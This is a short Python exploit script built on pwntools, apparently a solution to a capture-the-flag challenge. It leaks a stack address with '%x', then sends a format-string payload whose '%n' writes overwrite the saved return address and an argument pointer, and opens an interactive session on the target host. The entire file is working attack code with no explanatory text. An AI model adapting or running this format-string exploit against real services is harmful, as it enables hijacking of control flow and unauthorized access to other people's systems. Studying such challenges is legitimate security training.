#!/bin/python3
from pwn import remote
import sys

npad=26
fpad=b'%x%x%x%x'
fwrite=b'%n'
alignb=b'abcd'

retl=0x90f0
strl=0xa008
h=0x10804

def formatd(num):
    return b'%'+str(num).encode()+b'd'

def pl_gen(ebp):
    pretl=int.to_bytes(ebp+4, 4, 'little')
    pstrl=int.to_bytes(ebp+4+4+4, 4, 'little')
    preth=int.to_bytes(ebp+4+4-2, 4, 'little')
    pstrh=int.to_bytes(ebp+4+4+4+4-2, 4, 'little')
    return b''.join([
        pretl,
        alignb,
        pstrl,
        alignb,
        preth,
        pstrh,
        fpad,
        formatd(retl-npad-len(pretl)-2*len(alignb)-len(pstrl)-len(preth)-len(pstrh)),
        fwrite,
        formatd(strl-retl),
        fwrite,
        formatd(h-strl),
        fwrite,
        fwrite
        ])

def exploit(host, port):
    io = remote(host, port)
    io.recvuntil(b'can you bypass me???\n')
    io.send(b'%x')
    overflow = io.recv(8)
    overflow = int(overflow, base=16)
    ebp = overflow + 0x70
    io.send(pl_gen(ebp))
    io.clean()
    io.interactive()
    io.close()

if __name__=="__main__":
    if len(sys.argv) == 3:
        host = sys.argv[1]
        port = int(sys.argv[2])
        exploit(host, port)
        exit()
    print("Usage: ./exploit [host] [port]")
